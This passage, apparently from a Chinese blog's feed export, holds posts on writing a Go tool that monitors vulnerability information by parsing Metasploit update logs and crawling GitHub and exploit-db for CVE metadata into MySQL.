class="hljs-string">&quot;2006-01-02&quot;</span>)  <br>    logContent := now + <span class="hljs-string">&quot;\n&quot;</span> + result  <br>    utils<span class="hljs-selector-class">.WriteToLog</span>(logContent, mailLogPath)  <br>&#125;<br></code></pre></td></tr></table></figure><p>也就是对 git pull 的信息进行正则匹配，再到 rb 文件里找 CVE 号，并记录日志。</p><h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><p><img src="/2023/04/27/file-upload/age-20240124122712361.png"><br>参数为 init 时，首先将仓库克隆到本地。<br>参数为 monitor 时，git pull 并且对数据进行处理，本地仓库已经是最新，因此 mail_log，msf_update_info.log,msf_update_history.log 都为 Already up to date.<br>将 log 改为如下内容进行测试：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span><br>Updating <span class="hljs-number">0080718</span>..c63490c<br>Fast-forward<br> db/modules_metadata_base.json                      |  <span class="hljs-number">56</span> +++<br> ...<span class="hljs-regexp">/local/</span>cve_2022_21999_spoolfool_privesc.md      | <span class="hljs-number">210</span> ++++++++++<br> ...<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/api_constants.rb    |  <span class="hljs-number">35</span> +-<br> ...<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/def_advapi32.rb     |  <span class="hljs-number">71</span> ++++<br> ...<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/def_ntdll.rb        |   <span class="hljs-number">6</span> +<br> ...<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/def_spoolss.rb      |  <span class="hljs-number">28</span> ++<br> ...<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/def_winspool.rb     | <span class="hljs-number">102</span> +++++<br> ...<span class="hljs-regexp">/extensions/</span>stdapi<span class="hljs-regexp">/railgun/</span>railgun.rb           |   <span class="hljs-number">4</span> +-<br> ...<span class="hljs-regexp">/local/</span>cve_2022_21999_spoolfool_privesc.rb      | <span class="hljs-number">429</span> +++++++++++++++++++++<br> <span class="hljs-number">9</span> files changed, <span class="hljs-number">939</span> insertions(+), <span class="hljs-number">2</span> deletions(-)<br> create mode <span class="hljs-number">100644</span> documentation<span class="hljs-regexp">/modules/</span>exploit<span class="hljs-regexp">/windows/</span>local/cve_2022_21999_spoolfool_privesc.md<br> create mode <span class="hljs-number">100644</span> lib<span class="hljs-regexp">/rex/</span>post<span class="hljs-regexp">/meterpreter/</span>extensions<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/def_spoolss.rb<br> create mode <span class="hljs-number">100644</span> lib<span class="hljs-regexp">/rex/</span>post<span class="hljs-regexp">/meterpreter/</span>extensions<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/def_winspool.rb<br> create mode <span class="hljs-number">100644</span> modules<span class="hljs-regexp">/exploits/</span>windows<span class="hljs-regexp">/local/</span>cve_2022_21999_spoolfool_privesc.rb<br></code></pre></td></tr></table></figure><p>成功解析到更新的模块，并且将日志写入了 log 文件。<br><img src="/2023/04/27/file-upload/age-20240124123021951.png"> </p>]]></content>
    
    
    <categories>
      
      <category>crush</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crush</tag>
      
      <tag>golang</tag>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang 实现漏洞监控02——github 历史漏洞信息爬取</title>
    <link href="/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A702%E2%80%94%E2%80%94github%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/"/>
    <url>/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A702%E2%80%94%E2%80%94github%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h1 id="golang-实现漏洞监控02——github-历史漏洞信息爬取"><a href="#golang-实现漏洞监控02——github-历史漏洞信息爬取" class="headerlink" title="golang 实现漏洞监控02——github 历史漏洞信息爬取"></a>golang 实现漏洞监控02——github 历史漏洞信息爬取</h1><h2 id="整体功能"><a href="#整体功能" class="headerlink" title="整体功能"></a>整体功能</h2><p>从 github 的相关 API 接口搜索关键字 CVE-{YEAR}，并且按照 <code>best-match</code> 进行排序，获取每年的 CVE 中前 1000 个，再进行判活，去重等等筛选，最终存入数据库。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="getGithubHeader"><a href="#getGithubHeader" class="headerlink" title="getGithubHeader()"></a>getGithubHeader()</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getGithubHeader</span><span class="hljs-params">()</span></span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span> &#123;  <br>    token := cfg.Github.GithubToken  <br>    header := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;  <br>       <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;token &quot;</span> + token,  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> header  <br>&#125;<br></code></pre></td></tr></table></figure><p>该函数用于从 config 文件中获取 github token，如果不加上 token 访问，1h 只能访问 50 次：<br><img src="/2023/04/27/file-upload/image-20240108165255971.png"><br>加上 token 后尝试：<br><img src="/2023/04/27/file-upload/image-20240108165334891.png"><br>请求次数变成 6000.<br>更多详细配置参考官方文档：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cardlink">url: https://docs.github.com/v3/search/<br>title: &quot;Search - GitHub Docs&quot;<br>description: &quot;Use the REST API to search for specific items on GitHub.&quot;<br>host: docs.github.com<br>favicon: /crush_github/cb-345/images/site/favicon.png<br>image: https://github.githubcrush_github.com/images/modules/open_graph/github-logo.png<br></code></pre></td></tr></table></figure><h3 id="getCVEInfo-cve-string"><a href="#getCVEInfo-cve-string" class="headerlink" title="getCVEInfo(cve string)"></a>getCVEInfo(cve string)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getCVEInfo</span><span class="hljs-params">(cve <span class="hljs-type">string</span>)</span></span> (exists <span class="hljs-type">bool</span>, desc, cvss2, cvss3, cna <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) &#123;  <br>    url := nvdURL + cve  <br>    res, err := http.Get(url)  <br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;Error establishing connect:&quot;</span>, err)  <br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, err  <br>    &#125;  <br>    <span class="hljs-keyword">defer</span> res.Body.Close()  <br>  <br>    doc, err := goquery.NewDocumentFromReader(res.Body)  <br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;Error parsing html:&quot;</span>, err)  <br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, err  <br>    &#125;  <br>    <span class="hljs-comment">//exists</span><br>    <span class="hljs-comment">//cvss3 </span><br>    <span class="hljs-comment">//cna</span><br>    <span class="hljs-comment">//cvss2</span><br>    <span class="hljs-comment">//desc</span><br>  <br>    <span class="hljs-keyword">return</span> exists, desc, cvss2, cvss3, cna, <span class="hljs-literal">nil</span>  <br>&#125;<br></code></pre></td></tr></table></figure><p>该函数用来判断 CVE 是否存在，如果存在，从返回值取出漏洞描述以及评分信息。</p><h3 id="fetchGithub-year-page-int-wg-sync-WaitGroup-countchan-chan-struct"><a href="#fetchGithub-year-page-int-wg-sync-WaitGroup-countchan-chan-struct" class="headerlink" title="fetchGithub(year, page int, wg *sync.WaitGroup, countchan chan struct{})"></a>fetchGithub(year, page int, wg *sync.WaitGroup, countchan chan struct{})</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fetchGithub</span><span class="hljs-params">(year, page <span class="hljs-type">int</span>, wg *sync.WaitGroup, countchan <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)</span></span> &#123;  <br>    <span class="hljs-keyword">defer</span> wg.Done()  <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">data handle</span><br><span class="hljs-comment">...</span><br><span class="hljs-comment">*/</span><br>       err = database.InsertGithubDB(cve, desc, date_published, cvss2, cvss3, cna, poc_url)  <br>       <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br>          utils.PrintColor(<span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;Error insert vul:&quot;</span>, cve, <span class="hljs-string">&quot;\n&quot;</span>)  <br>          <span class="hljs-keyword">continue</span>  <br>       &#125;  <br>       countchan &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;  <span class="hljs-comment">//记录插入条数</span><br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>该函数用来完成对 github 数据的一次完整的爬取及处理。</p><h3 id="ConcurrentGitHubCrawler"><a href="#ConcurrentGitHubCrawler" class="headerlink" title="ConcurrentGitHubCrawler()"></a>ConcurrentGitHubCrawler()</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ConcurrentGitHubCrawler</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-keyword">var</span> wg, mainWG sync.WaitGroup  <br>    <span class="hljs-keyword">var</span> totalCount <span class="hljs-type">int</span>   <br>    <span class="hljs-keyword">for</span> year := startYear; year &lt;= endYear; year++ &#123;  <br>       mainWG.Add(<span class="hljs-number">1</span>)  <br>       yearCount := <span class="hljs-number">0</span>  <br>       countChan := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)  <br>       <span class="hljs-keyword">for</span> page := <span class="hljs-number">1</span>; page &lt;= <span class="hljs-number">10</span>; page++ &#123;  <br>          wg.Add(<span class="hljs-number">1</span>)  <br>          <span class="hljs-keyword">go</span> fetchGithub(year, page, &amp;wg, countChan)  <br>       &#125;  <br>  <br>       <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>          wg.Wait()  <br>          <span class="hljs-built_in">close</span>(countChan)  <br>          mainWG.Done()  <br>       &#125;()  <br>  <br>       <span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> countChan &#123;  <br>          yearCount++  <br>       &#125;  <br>  <br>       utils.PrintColor(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-string">&quot;Successfully insert %d CVE-%d vul&quot;</span>, yearCount, year) <br>       totalCount += yearCount  <br>    &#125;  <br>    mainWG.Wait()  <br>    utils.PrintColor(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-string">&quot;Github: Successfully insert %d vul info&quot;</span>, totalCount)  <br>&#125;<br></code></pre></td></tr></table></figure><p>该函数实现了 fetchGithub 函数的并发操作。<br>在外层循环中，依次遍历 year，并且在 mainwg 中加 1，到内层循环里，wg 加 1，并且执行爬取处理的函数，起一个协程来等待当前 year 下所有 page 的数据爬取完成，并且关闭 countChan，当前 year 完成后，通过 for range 来统计插入数据库的条数，当所有 year 的数据爬取完成后，主协程停止等待，并打印结果。</p><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="/2023/04/27/file-upload/image-20240108171217387.png"></p>]]></content>
    
    
    <categories>
      
      <category>crush</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crush</tag>
      
      <tag>golang</tag>
      
      <tag>github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang实现漏洞监控01——exploit_db历史漏洞信息爬取</title>
    <link href="/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A701%E2%80%94%E2%80%94exploit_db%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/"/>
    <url>/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A701%E2%80%94%E2%80%94exploit_db%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h1 id="golang实现漏洞监控01——exploit-db历史漏洞信息爬取"><a href="#golang实现漏洞监控01——exploit-db历史漏洞信息爬取" class="headerlink" title="golang实现漏洞监控01——exploit_db历史漏洞信息爬取"></a>golang实现漏洞监控01——exploit_db历史漏洞信息爬取</h1><h2 id="整体功能"><a href="#整体功能" class="headerlink" title="整体功能"></a>整体功能</h2><p>爬取exploit_db，github，seebug，metasploit，vulhub等多个平台的漏洞信息，并且监控每日更新，后续进行邮件推送等等。</p><p><img src="/2023/04/27/file-upload/age-20231207152846759.png" alt="image-20231207152846759"></p><p>init参数用来初始化，包括爬取历史漏洞信息等等。</p><p>crawl参数用来获取每日更新，并进行推送。</p><h2 id="exploit-db历史漏洞信息爬取"><a href="#exploit-db历史漏洞信息爬取" class="headerlink" title="exploit_db历史漏洞信息爬取"></a>exploit_db历史漏洞信息爬取</h2><p>主要分为两个模块：</p><ul><li>漏洞信息爬取</li><li>数据库操作</li></ul><h3 id="漏洞信息爬取"><a href="#漏洞信息爬取" class="headerlink" title="漏洞信息爬取"></a>漏洞信息爬取</h3><p>首先使用burp看一下请求和返回数据的包：</p><p><img src="/2023/04/27/file-upload/age-20231207153306130.png" alt="image-20231207153306130"></p><p>将url拼接到firefox访问，即可得到如下json数据：</p><p><img src="/2023/04/27/file-upload/age-20231207153553992.png" alt="image-20231207153553992"></p><p>简化后数据如下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">&#123;<span class="hljs-string">&quot;draw&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;recordsTotal&quot;</span>:<span class="hljs-number">45784</span>,<span class="hljs-string">&quot;recordsFiltered&quot;</span>:<span class="hljs-number">45784</span>,<span class="hljs-string">&quot;data&quot;</span>:[&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;51747&quot;</span>,<span class="hljs-string">&quot;description&quot;</span>:[<span class="hljs-string">&quot;51747&quot;</span>,<span class="hljs-string">&quot;Splunk 9.0.5 - admin account take over&quot;</span>],<span class="hljs-string">&quot;type_id&quot;</span>:<span class="hljs-string">&quot;WebApps&quot;</span>,<span class="hljs-string">&quot;platform_id&quot;</span>:<span class="hljs-string">&quot;Multiple&quot;</span>,<span class="hljs-string">&quot;author_id&quot;</span>:[<span class="hljs-string">&quot;11999&quot;</span>,<span class="hljs-string">&quot;Redway Security&quot;</span>],<span class="hljs-string">&quot;date_published&quot;</span>:<span class="hljs-string">&quot;2023-10-09&quot;</span>,<span class="hljs-string">&quot;verified&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;application_path&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;application_md5&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;port&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;screenshot_path&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;screenshot_thumb_path&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;tags&quot;</span>:[],<span class="hljs-string">&quot;code&quot;</span>:[&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;162454&quot;</span>,<span class="hljs-string">&quot;exploit_id&quot;</span>:<span class="hljs-string">&quot;51747&quot;</span>,<span class="hljs-string">&quot;code_type&quot;</span>:<span class="hljs-string">&quot;cve&quot;</span>,<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;2023-32707&quot;</span>&#125;],<span class="hljs-string">&quot;type&quot;</span>:&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;webapps&quot;</span>,<span class="hljs-string">&quot;display&quot;</span>:<span class="hljs-string">&quot;WebApps&quot;</span>&#125;,<span class="hljs-string">&quot;platform&quot;</span>:&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;24&quot;</span>,<span class="hljs-string">&quot;platform&quot;</span>:<span class="hljs-string">&quot;Multiple&quot;</span>&#125;,<span class="hljs-string">&quot;author&quot;</span>:&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;11999&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;Redway Security&quot;</span>&#125;,<span class="hljs-string">&quot;download&quot;</span>:<span class="hljs-string">&quot;&lt;a href=<span class="hljs-subst">\&quot;</span>\/download\/51747<span class="hljs-subst">\&quot;</span> aria-label=<span class="hljs-subst">\&quot;</span>Download51747<span class="hljs-subst">\&quot;</span>&gt;&lt;i class=<span class="hljs-subst">\&quot;</span>mdi mdi-download mdi-18px<span class="hljs-subst">\&quot;</span> style=<span class="hljs-subst">\&quot;</span>color: #132f50<span class="hljs-subst">\&quot;</span>&gt;&lt;\/i&gt;&lt;\/a&gt;&quot;</span>&#125;],<span class="hljs-string">&quot;0&quot;</span>:<span class="hljs-string">&quot;tags&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>:<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>:<span class="hljs-string">&quot;author:id,name&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>:<span class="hljs-string">&quot;type&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>:<span class="hljs-string">&quot;platform&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>要提取的漏洞信息即为json数据中data部分，将data中每条数据分别筛选处理即可。</p><p>在获取网站的response后，先转换成json格式，再存储到map[string]interface{}结构中，后续使用时先进行断言，再插入数据库的对应字段。</p><p>核心代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> data <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;<br><span class="hljs-keyword">if</span> err := json.Unmarshal(body, &amp;data); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error parsing into json:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">for</span> _, item := <span class="hljs-keyword">range</span> data[<span class="hljs-string">&quot;data&quot;</span>].([]<span class="hljs-keyword">interface</span>&#123;&#125;) &#123;<br>itemData := item.(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)<br>extractedData := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;<br><span class="hljs-string">&quot;id&quot;</span>:             itemData[<span class="hljs-string">&quot;id&quot;</span>],<br><span class="hljs-string">&quot;description&quot;</span>:    itemData[<span class="hljs-string">&quot;description&quot;</span>],<br><span class="hljs-string">&quot;type_id&quot;</span>:        itemData[<span class="hljs-string">&quot;type_id&quot;</span>],<br><span class="hljs-string">&quot;platform_id&quot;</span>:    itemData[<span class="hljs-string">&quot;platform_id&quot;</span>],<br><span class="hljs-string">&quot;date_published&quot;</span>: itemData[<span class="hljs-string">&quot;date_published&quot;</span>],<br><span class="hljs-string">&quot;verified&quot;</span>:       itemData[<span class="hljs-string">&quot;verified&quot;</span>],<br><span class="hljs-string">&quot;code&quot;</span>:           itemData[<span class="hljs-string">&quot;code&quot;</span>],<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>为了提高爬取速度，设置了20协程，并且通过一个chan struct{}来统计成功插入数据库的条数。</p><p>核心代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> semaphore = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;, <span class="hljs-number">20</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sendRequest</span><span class="hljs-params">(start <span class="hljs-type">int</span>, length <span class="hljs-type">int</span>, wg *sync.WaitGroup, successChan <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//释放信号量，允许其他协程执行</span><br>&lt;-semaphore<br>&#125;()<br><span class="hljs-comment">//获取信号量，控制并发数</span><br>semaphore &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>......<br>successChan &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Crawl</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br>successChan := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<br><br><span class="hljs-keyword">for</span> ... &#123;<br>wg.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> sendRequest(start, itemsPerPage, &amp;wg, successChan)<br>&#125;<br><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>wg.Wait()<br><span class="hljs-built_in">close</span>(successChan)<br>&#125;()<br><br>successCount := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> successChan &#123;<br>successCount++<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>数据库选择mysql，表结构如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go">_, err := db.Exec(<span class="hljs-string">`</span><br><span class="hljs-string">CREATE TABLE IF NOT EXISTS exploit_db (</span><br><span class="hljs-string">    id INT,</span><br><span class="hljs-string">description VARCHAR(255),</span><br><span class="hljs-string">type VARCHAR(50),</span><br><span class="hljs-string">platform VARCHAR(50),</span><br><span class="hljs-string">date_published DATE,</span><br><span class="hljs-string">verified INT,</span><br><span class="hljs-string">cve VARCHAR(2048),</span><br><span class="hljs-string">osvdb VARCHAR(2048),</span><br><span class="hljs-string">otherNum VARCHAR(2048)</span><br><span class="hljs-string">);</span><br><span class="hljs-string">`</span>)<br></code></pre></td></tr></table></figure><p>创建一个init()函数，用于在初始化时创建一个连接池，防止在并发爬取数据，插入数据库时，因为连接数过多而产生错误：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> db *sql.DB<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>initDB()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">initDB</span><span class="hljs-params">()</span></span> &#123;<br>connectionString := fmt.Sprintf(<span class="hljs-string">&quot;%s:%s@tcp(127.0.0.1:3306)/%s&quot;</span>, username, password, databaseConnection)<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>db, err = sql.Open(<span class="hljs-string">&quot;mysql&quot;</span>, connectionString)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error connecting mysql database:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>db.SetMaxIdleConns(<span class="hljs-number">20</span>)<br>db.SetMaxOpenConns(<span class="hljs-number">50</span>)<br><br><span class="hljs-keyword">if</span> err := db.Ping(); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error connecting mysql database:&quot;</span>, err)<br><span 